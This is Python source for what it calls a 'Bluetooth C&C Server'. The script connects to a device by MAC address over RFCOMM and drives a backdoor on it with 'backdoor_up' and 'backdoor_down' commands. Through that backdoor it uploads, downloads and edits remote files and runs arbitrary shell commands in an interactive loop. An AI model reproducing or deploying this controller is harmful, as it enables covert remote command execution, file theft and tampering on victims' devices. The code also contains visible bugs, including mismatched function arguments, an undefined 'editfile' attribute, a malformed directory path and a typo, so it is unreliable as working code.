from bluetooth import *
import os
import time
import argparse
import struct
import hashlib

p32 = lambda x : struct.pack("<i", x)
u32 = lambda x : struct.unpack("<i", x)

'''
mac_addr = input('MAC ADDR : ')
sock = BluetoothSocket(RFCOMM)
sock.connect((mac_addr, 1))
'''

def md5(data):
    enc = hashlib.md5()
    enc.update(data)

    return enc.digest()


def cmd_chk(socket,cmd):
    socket.send(cmd.encode())
    return int(socket.recv(1))


def chk_remote_path(socket,path):
    sock.send(p32(len(f'ls {path}')))
    sock.send(f"ls {path}".encode())
    time.sleep(1)
    data = sock.recv(1024)

    if b"No such file or directory" in data:
        sock.send(b'\x00')
        print("[-] Path Doesn't Exist At Remote")
        print("[-] Send File Fail")
        return False
    else:
        sock.send(b'\x01')
        return True


def chk_local_path(path):
    return os.path.isfile(path)


def send_file(socket,path,dst=None):
    if chk_local_path(path)==False:
        return -1
    if dst==None:
        dst = input("Destination Path : ")
        
    dst_dir_path, _ = os.path.split(dst)

    # HandShake
    if cmd_chk(socket, f"backdoor_up {dst}") == 0:
        return -3
    if chk_remote_path(socket,dst_dir_path)==False:
        return -2

    #send Data
    with open(path, "rb") as f:
        while True:
            data = f.read(1)
            if len(data) == 0:
                socket.send(b"\x00")
                break
            socket.send(b"\x01")
            socket.send(data)

    #Send MD5
    with open (path, "rb") as f:
        socket.send(md5(f.read())) #16byte
        if socket.recv(1) == b'\x01':
            print('[+] Send File Success')
            return 1
        else:
            print('[-] Send File Fail(MD5 Hash not match)')
            return -1

    
def recv_file(socket,path,dst=None):
    if dst == None:
        dst = input("Destination Path : ")
    if chk_local_path(dst)==False:
        #make directory
        os.makedirs("/".join(os.path.split("/")[:-1]))
        
    ### Recv file ###
    if cmd_chk(socket, f"backdoor_down {path}") == 0:
        return -3
    if chk_remote_path(socket, path)==False:
        return -2

    with open(dst, "ab") as f:
        while True:
            is_eof_flag = socket.recv(1)
            
            if is_eof_flag == b'\x00':
                break
            elif is_eof_flag == b"\x01":
                recv_data = socket.recv(1)
                f.write(recv_data)

    #Send MD5
    with open(dst, "rb") as f:
        socket.send(md5(f.read()))
        if socket.recv(1) == b'\x01':
            print('[+] Recv File Success')
            return 1
        else:
            print('[-] Recv File Fail(MD5 Hash not match)')
            return -1
        '''
        md5hash = socket.recv(16)
        if md5hash == md5(recv_data):
            return 1
        else:
            retrun -1
        '''


def edit_file(socket,path):
    recv_file(socket, path,".")
    ### Edit file###

    send_file(socket,"."+"/"+path.split("/")[-1])
    os.remove("."+"/"+path.split("/")[-1])


def shell(socket):
    while(1):
        print("Default mode is interactive command line")
        mode = input("Command : ")
        if (mode == "sendfile") or (mode == "s") :
            path = input("local file path to send : ")
            send_file(path)
            print("Sending File : {}")

        elif (mode == "recvfile") or (mode == "r"):
            path = input("Remote file path to download : ")
            recv_file(path)
            print("Receiving File : {}")

        elif (mode == "editfile") or (mode == "e"):
            path = input("Remote file path to edit : ")
            edit_file(path)
            print("Editing File : {}")

        else:
            try:
                sock.send(mode)
                time.sleep(1)
                data = sock.recv(1024)
                print(data.decode('euc-kr'))
                    
            except KeyboardInterrupt:
                print('Finished')
                break

    sock.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Bluetooth C&C Server')
    parser.add_argument("-m", "--macaddr",type=str, dest="mac",action="store",required=True)
    parser.add_argument("-s", "--sendfile",type=str, dest="sendfile",action="store")
    parser.add_argument("-r", "--recvfile",type=str, dest="recvfile",action="store")
    parser.add_argument("-e", "--editfile",type=str, dest="sendfile",action="store")
    
    args= parser.parse_args()
    print(args)

    #connection
    mac_addr = args.mac
    sock = BluetoothSocket(RFCOMM)
    sock.connect((mac_addr, 1))

    if args.sendfile != None:
        send_file(sock,args.sendfile)
        exit()
    if args.recvfile != None:
        recv_file(sock,args.recvfile)
        exit()
    if args.editfile != None:
        edit_file(sock,args.editfile)
        exit()

    shell(sock)
